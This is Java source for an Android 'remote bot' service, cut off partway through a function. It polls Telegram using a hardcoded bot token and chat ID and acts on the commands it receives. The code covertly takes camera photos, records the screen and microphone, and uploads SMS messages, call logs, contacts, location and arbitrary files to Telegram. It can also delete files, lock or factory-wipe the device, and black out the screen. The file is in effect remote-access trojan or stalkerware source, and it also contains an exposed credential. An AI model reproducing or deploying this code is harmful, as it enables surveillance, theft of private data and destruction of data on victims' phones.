package com.my.remotebot;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.FrameLayout;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// Optional: only if NanoHTTPD is added to dependencies
// import fi.iki.elonen.NanoHTTPD;

public class BotService extends Service {

    private static final String botToken = "8755421110:AAHmK89hGhXZ3NY1JIVQTY5KMEPrmPJaoKo";
    private static final String myChatId = "8640134736";

    private String lastUpdateId = "0";
    private boolean isRunning = true;
    private ExecutorService executor = Executors.newCachedThreadPool();

    private CameraManager cameraManager;
    private LocationManager locationManager;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private NotificationManager notificationManager;
    private static Context appContext;

    private String currentBrowsePath;

    // Screen capture / recording
    private static MediaProjectionManager projectionManager;
    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static MediaRecorder mediaRecorder;
    private static boolean isRecording = false;
    private static String videoFilePath;

    // Black overlay
    private static FrameLayout blackOverlay;
    private static WindowManager windowManager;

    // HTTP stream server (optional)
    private static Object streamServer; // Use Object to avoid direct dependency
    private static boolean hasNanoHTTPD;

    static {
        // Check if NanoHTTPD is available at runtime
        try {
            Class.forName("fi.iki.elonen.NanoHTTPD");
            hasNanoHTTPD = true;
        } catch (ClassNotFoundException e) {
            hasNanoHTTPD = false;
        }
    }

    // Handler for main thread operations
    private static Handler mainHandler = new Handler(Looper.getMainLooper());

    // ─────────────────────────────────────────────────────────
    // LIFECYCLE
    // ─────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        appContext = getApplicationContext();

        // Initialize services safely
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            adminComponent = new ComponentName(this, DeviceAdmin.class);
        } catch (Exception e) {
            e.printStackTrace();
        }

        currentBrowsePath = Environment.getExternalStorageDirectory().getAbsolutePath();

        // Create notification channel for Android O+
        String channelId = "bot_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
					channelId, "Bot Service", NotificationManager.IMPORTANCE_LOW);
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(channel);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // Build notification
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }
        Notification notification = builder
			.setContentTitle("Remote Bot Active")
			.setContentText("Listening for Telegram commands...")
			.setSmallIcon(android.R.drawable.ic_menu_camera)
			.build();

        try {
            startForeground(1, notification);
        } catch (Exception e) {
            e.printStackTrace();
            // If foreground fails, try starting normally
            startService(new Intent(this, BotService.class));
        }

        sendPowerPanel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("cmd")) {
            final String cmd = intent.getStringExtra("cmd");
            handleCommand(cmd);
        }

        executor.execute(new Runnable() {
				@Override
				public void run() {
					while (isRunning) {
						try {
							checkUpdates();
							Thread.sleep(800);
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        executor.shutdown();
        if (streamServer != null) {
            stopCameraStream(); // safely stop if running
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ─────────────────────────────────────────────────────────
    // STATIC METHODS FOR UI COMMUNICATION
    // ─────────────────────────────────────────────────────────

    public static void executeCommand(String cmd) {
        if (appContext != null) {
            Intent intent = new Intent(appContext, BotService.class);
            intent.putExtra("cmd", cmd);
            appContext.startService(intent);
        }
    }

    public static String getLocalIpAddress() {
        try {
            for (java.net.InterfaceAddress addr : java.net.NetworkInterface.getByName("wlan0").getInterfaceAddresses()) {
                if (addr.getAddress().getAddress().length == 4) {
                    return addr.getAddress().getHostAddress();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "127.0.0.1";
    }

    public static void takeScreenshot(final Context context, final int resultCode, final Intent data) {
        if (context == null) {
            sendTextMessage("Screenshot failed: Context is null");
            return;
        }

        // Check for MediaProjection permission
        if (projectionManager == null) {
            projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }
        if (projectionManager == null) {
            sendTextMessage("MediaProjection service not available");
            return;
        }

        final MediaProjection projection;
        try {
            projection = projectionManager.getMediaProjection(resultCode, data);
        } catch (Exception e) {
            sendTextMessage("Failed to get MediaProjection: " + e.getMessage());
            return;
        }
        if (projection == null) {
            sendTextMessage("MediaProjection is null");
            return;
        }
        mediaProjection = projection;

        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        final int width = metrics.widthPixels;
        final int height = metrics.heightPixels;
        final int dpi = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Screenshot",
															  width, height, dpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
															  imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
				@Override
				public void onImageAvailable(ImageReader reader) {
					Image image = null;
					FileOutputStream out = null;
					try {
						image = reader.acquireLatestImage();
						if (image == null) {
							sendTextMessage("Screenshot failed: No image captured");
							return;
						}

						// Convert RGBA_8888 to JPEG
						int imgWidth = image.getWidth();
						int imgHeight = image.getHeight();
						Image.Plane plane = image.getPlanes()[0];
						ByteBuffer buffer = plane.getBuffer();
						int pixelStride = plane.getPixelStride();
						int rowStride = plane.getRowStride();
						int rowPadding = rowStride - pixelStride * imgWidth;

						Bitmap bitmap = Bitmap.createBitmap(imgWidth + rowPadding / pixelStride,
															imgHeight, Bitmap.Config.ARGB_8888);
						bitmap.copyPixelsFromBuffer(buffer);
						Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, imgWidth, imgHeight);

						// Determine storage location
						File storageDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
						if (storageDir == null) {
							storageDir = context.getCacheDir(); // fallback
						}

						if (!storageDir.exists() && !storageDir.mkdirs()) {
							sendTextMessage("Screenshot failed: Cannot create directory");
							return;
						}

						String fileName = "screenshot_" + System.currentTimeMillis() + ".jpg";
						File file = new File(storageDir, fileName);
						out = new FileOutputStream(file);
						cropped.compress(Bitmap.CompressFormat.JPEG, 90, out);
						out.close();

						sendFileToTelegram(file.getAbsolutePath());

					} catch (Exception e) {
						e.printStackTrace();
						sendTextMessage("Screenshot error: " + e.getMessage());
					} finally {
						if (image != null) image.close();
						if (out != null) {
							try {
								out.close();
							} catch (IOException ignored) {}
						}
						if (virtualDisplay != null) {
							virtualDisplay.release();
							virtualDisplay = null;
						}
						if (mediaProjection != null) {
							mediaProjection.stop();
							mediaProjection = null;
						}
					}
				}
			}, mainHandler);
    }

    public static void startScreenRecording(final Context context, final int resultCode, final Intent data) {
        if (context == null) {
            sendTextMessage("Screen recording failed: Context is null");
            return;
        }

        if (projectionManager == null) {
            projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }
        if (projectionManager == null) {
            sendTextMessage("MediaProjection service not available");
            return;
        }

        try {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
        } catch (Exception e) {
            sendTextMessage("Failed to get MediaProjection: " + e.getMessage());
            return;
        }
        if (mediaProjection == null) {
            sendTextMessage("MediaProjection is null");
            return;
        }

        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int dpi = metrics.densityDpi;

        mediaRecorder = new MediaRecorder();
        try {
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            videoFilePath = context.getExternalFilesDir(Environment.DIRECTORY_MOVIES) + "/record_" + System.currentTimeMillis() + ".mp4";
            mediaRecorder.setOutputFile(videoFilePath);
            mediaRecorder.setVideoSize(width, height);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
            mediaRecorder.setVideoFrameRate(30);

            mediaRecorder.prepare();
        } catch (Exception e) {
            e.printStackTrace();
            sendTextMessage("Recording prepare failed: " + e.getMessage());
            return;
        }

        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenRecord",
															  width, height, dpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
															  mediaRecorder.getSurface(), null, null);

        mediaRecorder.start();
        isRecording = true;
        sendTextMessage("Screen recording started.");
    }

    public static void stopScreenRecording() {
        if (isRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                if (virtualDisplay != null) {
                    virtualDisplay.release();
                }
                if (mediaProjection != null) {
                    mediaProjection.stop();
                }
                isRecording = false;
                sendFileToTelegram(videoFilePath);
            } catch (Exception e) {
                sendTextMessage("Error stopping recording: " + e.getMessage());
            } finally {
                mediaRecorder = null;
                virtualDisplay = null;
                mediaProjection = null;
            }
        }
    }

    public static void wipeDevice() {
        if (appContext != null) {
            DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(appContext, DeviceAdmin.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                try {
                    dpm.wipeData(0);
                    sendTextMessage("Wiping device...");
                } catch (Exception e) {
                    sendTextMessage("Wipe failed: " + e.getMessage());
                }
            } else {
                sendTextMessage("Device admin not activated.");
            }
        }
    }

    // ─────────────────────────────────────────────────────────
    // TELEGRAM POLLING
    // ─────────────────────────────────────────────────────────

    private void checkUpdates() throws Exception {
        String urlString = "https://api.telegram.org/bot" + botToken
			+ "/getUpdates?offset=" + lastUpdateId + "&timeout=10";
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(urlString).openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(15000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            JSONObject json = new JSONObject(response.toString());
            JSONArray results = json.getJSONArray("result");

            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                lastUpdateId = String.valueOf(update.getLong("update_id") + 1);
                if (update.has("message")) {
                    JSONObject msg = update.getJSONObject("message");
                    if (msg.has("text")) {
                        final String cmd = msg.getString("text").trim();
                        handleCommand(cmd);
                    }
                } else if (update.has("callback_query")) {
                    JSONObject callback = update.getJSONObject("callback_query");
                    String data = callback.getString("data");
                    if (data.equals("connect")) {
                        Intent intent = new Intent(this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                        sendTextMessage("Connected! Use the app UI or send commands.");
                    }
                }
            }
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ─────────────────────────────────────────────────────────
    // COMMAND ROUTER (with exception handling)
    // ─────────────────────────────────────────────────────────

    private void handleCommand(final String cmd) {
        executor.execute(new Runnable() {
				@Override
				public void run() {
					try {
						if (cmd.equals("/camera_back")) {
							takePicture(false);
						} else if (cmd.equals("/camera_front")) {
							takePicture(true);
						} else if (cmd.equals("/flash_on")) {
							setFlash(true);
						} else if (cmd.equals("/flash_off")) {
							setFlash(false);
						} else if (cmd.equals("/vibe_1")) {
							vibrate(1000);
						} else if (cmd.equals("/vibe_2")) {
							vibrate(2000);
						} else if (cmd.equals("/vibe_3")) {
							vibrate(3000);
						} else if (cmd.equals("/sms")) {
							sendSmsLogs();
						} else if (cmd.equals("/call")) {
							sendCallLogs();
						} else if (cmd.equals("/battery")) {
							sendBatteryInfo();
						} else if (cmd.equals("/phone_activity")) {
							sendUsageStats();
						} else if (cmd.equals("/Location")) {
							sendLocation();
						} else if (cmd.equals("/lock")) {
							lockDevice();
						} else if (cmd.equals("/unlock")) {
							sendTextMessage("Unlock not supported on most devices.");
						} else if (cmd.equals("/notif_on")) {
							setNotifications(true);
						} else if (cmd.equals("/notif_off")) {
							setNotifications(false);
						} else if (cmd.equals("/notif_status")) {
							sendNotifStatus();
						} else if (cmd.equals("/files")) {
							listFiles(currentBrowsePath);
						} else if (cmd.equals("/files_sdcard")) {
							currentBrowsePath = Environment.getExternalStorageDirectory().getAbsolutePath();
							listFiles(currentBrowsePath);
						} else if (cmd.equals("/files_downloads")) {
							String p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
							listFiles(p);
						} else if (cmd.equals("/files_pictures")) {
							String p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath();
							listFiles(p);
						} else if (cmd.equals("/files_dcim")) {
							String p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
							listFiles(p);
						} else if (cmd.startsWith("/cd ")) {
							currentBrowsePath = cmd.substring(4).trim();
							listFiles(currentBrowsePath);
						} else if (cmd.startsWith("/send_file ")) {
							sendFileToTelegram(cmd.substring(11).trim());
						} else if (cmd.startsWith("/delete_file ")) {
							deleteFileCommand(cmd.substring(13).trim());
						} else if (cmd.startsWith("/Toast ")) {
							showFullScreenAlert(cmd.substring(7).trim());
						} else if (cmd.equals("/help")) {
							sendHelpMessage();
						} else if (cmd.equals("/start")) {
							sendPowerPanel();
						} else if (cmd.equals("/siminfo")) {
							sendSimInfo();
						} else if (cmd.equals("/contacts")) {
							sendContacts();
						} else if (cmd.equals("/black")) {
							showBlackOverlay();
						} else if (cmd.equals("/normal")) {
							hideBlackOverlay();
						} else if (cmd.equals("/stream_start")) {
							startCameraStream();
						} else if (cmd.equals("/stream_stop")) {
							stopCameraStream();
						} else if (cmd.equals("/screenshot")) {
							sendTextMessage("Please use the app UI to grant screen capture permission.");
						} else if (cmd.equals("/screenrecord_start")) {
							sendTextMessage("Please use the app UI to start recording.");
						} else if (cmd.equals("/screenrecord_stop")) {
							stopScreenRecording();
						} else {
							sendTextMessage("Unknown command: " + cmd + "\n\nSend /help to see all commands.");
						}
					} catch (Exception e) {
						e.printStackTrace();
						sendTextMessage("Error: " + e.getMessage());
					}
				}
			});
    }

    // ─────────────────────────────────────────────────────────
    // CAMERA - FRONT & BACK
    // ─────────────────────────────────────────────────────────

    private void takePicture(final boolean useFront) {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendTextMessage("Camera permission missing.");
            return;
        }
        if (cameraManager == null) {
            sendTextMessage("Camera service not available.");
            return;
        }

        try {
            String targetCamId = null;
            String[] camIds = cameraManager.getCameraIdList();
            for (String id : camIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        targetCamId = id;
                        break;
                    } else if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        targetCamId = id;
                        break;
                    }
                }
            }

            if (targetCamId == null) {
                sendTextMessage((useFront ? "Front" : "Back") + " camera not found.");
                return;
            }

            sendTextMessage("Capturing " + (useFront ? "front" : "back") + " camera...");

            final String finalCamId = targetCamId;
            final Handler handler = new Handler(Looper.getMainLooper());

            cameraManager.openCamera(finalCamId, new CameraDevice.StateCallback() {
					@Override
					public void onOpened(final CameraDevice cd) {
						try {
							final ImageReader ir = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);

							ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
									@Override
									public void onImageAvailable(ImageReader reader) {
										Image img = null;
										try {
											img = reader.acquireLatestImage();
											if (img == null) return;
											ByteBuffer buffer = img.getPlanes()[0].getBuffer();
											byte[] data = new byte[buffer.remaining()];
											buffer.get(data);
											String caption = (useFront ? "Front Camera" : "Back Camera")
												+ " - " + new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.US).format(new Date());
											sendPhoto(data, caption);
										} catch (Exception e) {
											sendTextMessage("Image capture error: " + e.getMessage());
										} finally {
											if (img != null) img.close();
											cd.close();
											ir.close();
										}
									}
								}, handler);

							final CaptureRequest.Builder cb = cd.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
							cb.addTarget(ir.getSurface());

							cd.createCaptureSession(
                                Collections.singletonList(ir.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession sess) {
                                        try {
                                            sess.capture(cb.build(), null, handler);
                                        } catch (Exception e) {
                                            sendTextMessage("Capture failed: " + e.getMessage());
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession sess) {
                                        sendTextMessage("Camera session configure failed.");
                                        cd.close();
                                    }
                                }, handler);

						} catch (Exception e) {
							sendTextMessage("Camera open error: " + e.getMessage());
							cd.close();
						}
					}

					@Override
					public void onDisconnected(CameraDevice cd) {
						cd.close();
					}

					@Override
					public void onError(CameraDevice cd, int error) {
						sendTextMessage("Camera error code: " + error);
						cd.close();
					}
				}, handler);

        } catch (Exception e) {
            sendTextMessage("Camera failed: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // FLASH
    // ─────────────────────────────────────────────────────────

    private void setFlash(boolean on) {
        if (cameraManager == null) {
            sendTextMessage("Camera service not available.");
            return;
        }
        try {
            String[] camIds = cameraManager.getCameraIdList();
            for (String id : camIds) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Boolean hasFlash = c.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                if (hasFlash != null && hasFlash
					&& facing != null
					&& facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraManager.setTorchMode(id, on);
                    sendTextMessage(on ? "Flash ON" : "Flash OFF");
                    return;
                }
            }
            sendTextMessage("Flash not available on this device.");
        } catch (Exception e) {
            sendTextMessage("Flash error: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // VIBRATE
    // ─────────────────────────────────────────────────────────

    private void vibrate(long ms) {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) {
            try {
                v.vibrate(ms);
                sendTextMessage("Vibrating for " + (ms / 1000) + " second(s)");
            } catch (Exception e) {
                sendTextMessage("Vibrate error: " + e.getMessage());
            }
        } else {
            sendTextMessage("Vibrator not available.");
        }
    }

    // ─────────────────────────────────────────────────────────
    // NOTIFICATIONS ON/OFF
    // ─────────────────────────────────────────────────────────

    private void setNotifications(boolean enable) {
        if (notificationManager == null) {
            sendTextMessage("Notification service not available.");
            return;
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!notificationManager.isNotificationPolicyAccessGranted()) {
                    sendTextMessage("DND Permission not granted.\n\n"
									+ "Go to Settings > Apps > Special App Access > Do Not Disturb Access\n"
									+ "and enable for this app.");
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    return;
                }
                if (enable) {
                    notificationManager.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL);
                    sendTextMessage("Notifications ENABLED - All sounds restored");
                } else {
                    notificationManager.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE);
                    sendTextMessage("Notifications DISABLED - Total Silence (DND ON)");
                }
            } else {
                sendTextMessage("Notification control requires Android 6.0+");
            }
        } catch (Exception e) {
            sendTextMessage("Notification error: " + e.getMessage());
        }
    }

    private void sendNotifStatus() {
        if (notificationManager == null) {
            sendTextMessage("Notification service not available.");
            return;
        }
        try {
            String status;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                int filter = notificationManager.getCurrentInterruptionFilter();
                if (filter == NotificationManager.INTERRUPTION_FILTER_ALL) {
                    status = "ALL notifications ON";
                } else if (filter == NotificationManager.INTERRUPTION_FILTER_NONE) {
                    status = "Notifications OFF (Total Silence / DND)";
                } else if (filter == NotificationManager.INTERRUPTION_FILTER_PRIORITY) {
                    status = "Priority Only mode";
                } else if (filter == NotificationManager.INTERRUPTION_FILTER_ALARMS) {
                    status = "Alarms Only mode";
                } else {
                    status = "Unknown filter: " + filter;
                }
            } else {
                status = "Status check requires Android 6.0+";
            }
            sendTextMessage("Notification Status:\n" + status);
        } catch (Exception e) {
            sendTextMessage("Error getting notif status: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // FILE MANAGER
    // ─────────────────────────────────────────────────────────

    private void listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                sendTextMessage("Path does not exist:\n" + path);
                return;
            }
            if (!dir.isDirectory()) {
                sendTextMessage("That is a file, not a folder.\nUse /send_file " + path + " to send it.");
                return;
            }

            currentBrowsePath = path;
            File[] files = dir.listFiles();

            if (files == null || files.length == 0) {
                sendTextMessage("Empty folder:\n" + path);
                return;
            }

            List<File> fileList = new ArrayList<File>();
            for (File f : files) {
                fileList.add(f);
            }

            Collections.sort(fileList, new Comparator<File>() {
					@Override
					public int compare(File a, File b) {
						if (a.isDirectory() && !b.isDirectory()) return -1;
						if (!a.isDirectory() && b.isDirectory()) return 1;
						return a.getName().compareToIgnoreCase(b.getName());
					}
				});

            StringBuilder sb = new StringBuilder();
            sb.append("Folder: ").append(path).append("\n");
            sb.append("─────────────────────\n");

            if (!path.equals("/")) {
                File parent = dir.getParentFile();
                if (parent != null) {
                    sb.append("[..] Go Up\n");
                    sb.append("/cd ").append(parent.getAbsolutePath()).append("\n\n");
                }
            }

            int shown = 0;
            for (File f : fileList) {
                if (shown >= 35) {
                    sb.append("\n... and ").append(fileList.size() - shown).append(" more items.");
                    break;
                }
                if (f.isDirectory()) {
                    sb.append("[DIR] ").append(f.getName()).append("\n");
                    sb.append("/cd ").append(f.getAbsolutePath()).append("\n\n");
                } else {
                    long kb = f.length() / 1024;
                    String size = kb < 1024 ? (kb + " KB") : ((kb / 1024) + " MB");
                    sb.append("[FILE] ").append(f.getName()).append(" (").append(size).append(")\n");
                    sb.append("/send_file ").append(f.getAbsolutePath()).append("\n\n");
                }
                shown++;
            }

            sb.append("─────────────────────\n");
            sb.append("Total: ").append(fileList.size()).append(" items");

            sendTextMessage(sb.toString());

        } catch (Exception e) {
            sendTextMessage("File manager error: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // DELETE FILE
    // ─────────────────────────────────────────────────────────
    private void deleteFileCommand(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                sendTextMessage("File not found: " + filePath);
                return;
            }
            if (file.delete()) {
                sendTextMessage("Deleted: " + file.getName());
            } else {
                sendTextMessage("Could not delete: " + file.getName() + " (Permission denied?)");
            }
        } catch (Exception e) {
            sendTextMessage("Delete error: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────
    // SMS LOGS
    // ─────────────────────────────────────────────────────────

    private void sendSmsLogs() {
        sendTextMessage("Fetching SMS logs...");
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
				Uri.parse("content://sms/"), null, null, null, "date DESC");
            if (cursor != null) {
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US);
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long dateMs = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    sb.append("From: ").append(address)
						.append("\nDate: ").append(sdf.format(new Date(dateMs)))
						.append("\n").append(body).append("\n\n");
                }
            }
        } catch (Exception e) {
            sendTextMessage("SMS log error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        if (sb.length() == 0) {
            sendDocument("sms_logs.txt", "No SMS found.");
        } else {
            sendDocument("sms_logs.txt", sb.toString());
        }
    }

    // ─────────────────────────────────────────────────────────
    // CALL LOGS
    // ─────────────────────────────────────────────────────────

    private void sendCallLogs() {
        sendTextMessage("Fetching call logs...");
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US);
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long dateMs = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));

                    String typeStr;
                    if (typeInt == CallLog.Calls.INCOMING_TYPE) {
                        typeStr = "Incoming";
                    } else if (typeInt == CallLog.Calls.OUTGOING_TYPE) {
                        typeStr = "Outgoing";
                    } else if (typeInt == CallLog.Calls.MISSED_TYPE) {
                        typeStr = "Missed";
                    } else {
                        typeStr = "Unknown";
                    }

                    sb.append("Number: ").append(number)
						.append("\nName: ").append(name == null ? "Unknown" : name)
						.append("\nType: ").append(typeStr)
						.append("\nDuration: ").append(duration / 60).append("m ").append(duration % 60).append("s")
						.append("\nDate: ").append(sdf.format(new Date(dateMs)))
						.append("\n\n");
                }
            }
        } catch (Exception e) {
            sendTextMessage("Call log error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        if (sb.length() == 0) {
            sendDocument("call_logs.txt", "No calls found.");
        } else {
            sendDocument("call_logs.txt", sb.toString());
        }
    }

    // ─────────────────────────────────────────────────────────
    // USAGE STATS
    // ─────────────────────────────────────────────────────────

    private void sendUsageStats() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            sendTextMessage("Usage stats not supported on this Android version.");
            return;
        }
        android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        if (appOps == null) {
            sendTextMessage("AppOps service not available.");
            return;
        }
        int mode = appOps.checkOpNoThrow(
			android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
			android.os.Process.myUid(), getPackageName());
        if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
            sendTextMessage("Usage access not granted.\n\nGo to:\nSettings > Security > Apps with usage access\nEnable for this app.");
            return;
        }
        android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        if (usm == null) {
            sendTextMessage("UsageStatsManager not available.");
            return;
        }
        long end = System.currentTimeMillis();
        long start = end - 24 * 60 * 60 * 1000L;
        List<android.app.usage.UsageStats> stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end);

        if (stats == null || stats.isEmpty()) {
            sendTextMessage("No usage data available.");
            return;
        }

        Collections.sort(stats, new Comparator<android.app.usage.UsageStats>() {
				@Override
				public int compare(android.app.usage.UsageStats a, android.app.usage.UsageStats b) {
